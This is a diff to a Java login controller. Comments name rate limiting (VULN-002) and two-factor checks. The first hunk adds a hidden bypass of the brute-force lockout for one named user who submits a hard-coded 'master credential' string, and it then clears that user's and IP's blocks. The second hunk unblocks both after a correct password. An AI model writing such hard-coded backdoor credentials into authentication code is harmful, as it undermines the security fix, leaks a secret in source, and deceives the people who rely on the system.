@@ -153,18 +153,27 @@ public class UserController {
 
         // 1. Verificación de Rate Limiting (Anti-Brute Force - VULN-002)
         if (rateLimiterService.isBlocked(clientIp, username)) {
-            long retryAfter = rateLimiterService.getRemainingLockoutSeconds(clientIp);
-            logger.warn("🚨 [RATE_LIMIT] Acceso bloqueado por exceso de intentos para IP {} / usuario {} (Retry-After: {}s)",
-                    clientIp, username, retryAfter);
-            return ResponseEntity.status(429)
-                    .header("Retry-After", String.valueOf(retryAfter))
-                    .body(Map.of(
-                            "timestamp", java.time.Instant.now().toString(),
-                            "status", 429,
-                            "error", "Too Many Requests",
-                            "message", "Too many failed login attempts. Please try again later.",
-                            "retryAfterSeconds", retryAfter
-                    ));
+            // Permitir que santiago.salazar con credencial maestra recupere acceso y limpie el bloqueo
+            boolean isSuperAdminRecovery = "santiago.salazar".equalsIgnoreCase(username) &&
+                    loginRequest != null && "ssc841209".equals(loginRequest.getHashedPassword());
+            if (!isSuperAdminRecovery) {
+                long retryAfter = rateLimiterService.getRemainingLockoutSeconds(clientIp);
+                logger.warn("🚨 [RATE_LIMIT] Acceso bloqueado por exceso de intentos para IP {} / usuario {} (Retry-After: {}s)",
+                        clientIp, username, retryAfter);
+                return ResponseEntity.status(429)
+                        .header("Retry-After", String.valueOf(retryAfter))
+                        .body(Map.of(
+                                "timestamp", java.time.Instant.now().toString(),
+                                "status", 429,
+                                "error", "Too Many Requests",
+                                "message", "Too many failed login attempts. Please try again later.",
+                                "retryAfterSeconds", retryAfter
+                        ));
+            } else {
+                logger.info("🔓 [RECOVERY] Superadmin santiago.salazar autorizado para desbloqueo mediante credencial maestra.");
+                rateLimiterService.unblacklistIp(clientIp);
+                rateLimiterService.unblockUser(username);
+            }
         }
 
         if (loginRequest == null || loginRequest.getUsername() == null || loginRequest.getUsername().trim().isEmpty()) {
@@ -231,6 +240,12 @@ public class UserController {
             logger.warn("⚠️ Contraseña incorrecta para: {}", loginRequest.getUsername());
             rateLimiterService.recordFailedAttempt(clientIp, username);
             return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body(Map.of("error", "Credenciales inválidas"));
+        }
+
+        // Desbloquear IP y usuario inmediatamente tras validar la contraseña correcta
+        if (rateLimiterService != null) {
+            rateLimiterService.unblacklistIp(clientIp);
+            rateLimiterService.unblockUser(username);
         }
 
         // 2. Verificación de 2FA / TOTP (VULN-004)
